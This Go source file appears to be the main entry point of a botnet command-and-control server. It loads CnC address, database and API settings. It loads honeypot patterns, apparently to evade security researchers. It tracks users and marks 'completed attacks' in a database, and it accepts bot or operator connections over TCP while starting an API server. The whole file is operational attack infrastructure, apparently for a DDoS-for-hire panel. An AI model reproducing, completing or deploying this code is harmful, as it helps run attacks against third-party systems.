package main

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	_ "net/http/pprof"
	"os"
	"time"
)

type Config struct {
	CncIP            string `json:"cnc_ip"`
	CncPort          string `json:"cnc_port"`
	ApiPort          string `json:"api_port"`
	DatabaseIP       string `json:"database_ip"`
	DatabaseName     string `json:"database_name"`
	DatabaseUser     string `json:"database_user"`
	DatabasePassword string `json:"database_password"`
	IPInfoToken      string `json:"ipinfo_token"`
	GobalSlot        int    `json:"gobal_slot"`
	Version          string `json:"version"`
}

var config *Config
var clientList *ClientList = NewClientList()
var database *Database

func loadConfig() (*Config, error) {
	file, err := os.Open("config.json")
	if err != nil {
		return nil, fmt.Errorf("failed to open config.json: %v", err)
	}
	defer file.Close()

	var cfg Config
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&cfg)
	if err != nil {
		return nil, fmt.Errorf("failed to decode config.json: %v", err)
	}

	if cfg.CncIP == "" || cfg.CncPort == "" || cfg.ApiPort == "" || cfg.DatabaseIP == "" || cfg.DatabaseName == "" || cfg.DatabaseUser == "" || cfg.DatabasePassword == "" || cfg.IPInfoToken == "" || cfg.GobalSlot <= 0 || cfg.Version == "" {
		return nil, fmt.Errorf("missing required configuration fields or invalid gobal_slot")
	}

	return &cfg, nil
}

func main() {
	rand.Seed(time.Now().UnixNano())
	var err error
	config, err = loadConfig()
	if err != nil {
		fmt.Println("Failed to load config:", err)
		return
	}

	database = NewDatabase(config.DatabaseIP, config.DatabaseUser, config.DatabasePassword, config.DatabaseName)
	if database == nil {
		fmt.Println("Failed to initialize database")
		return
	}

	err = loadHoneypotPatterns("honeypot.json")
	if err != nil {
		log.Printf("Failed to load honeypot patterns: %v", err)
	} else {
		log.Printf("Loaded %d honeypot patterns", len(honeypotPatterns))
	}

	_, err = database.db.Exec("UPDATE users SET online = 0")
	if err != nil {
		fmt.Println("Error resetting user online status:", err)
		return
	}
	go func() {
		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				rowsAffected, err := database.MarkCompletedAttacks()
				if err != nil {
					fmt.Println("Error updating completed attacks:", err)
				}
				if rowsAffected > 0 {
					fmt.Printf("Marked %d attacks as completed.\n", rowsAffected)
				}
			}
		}
	}()
	address := fmt.Sprintf("%s:%s", config.CncIP, config.CncPort)
	tel, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println(err)
		return
	}

	go StartAPIServer(config.ApiPort)

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}

	fmt.Println("ERROR: run ulimit -n 999999")
}
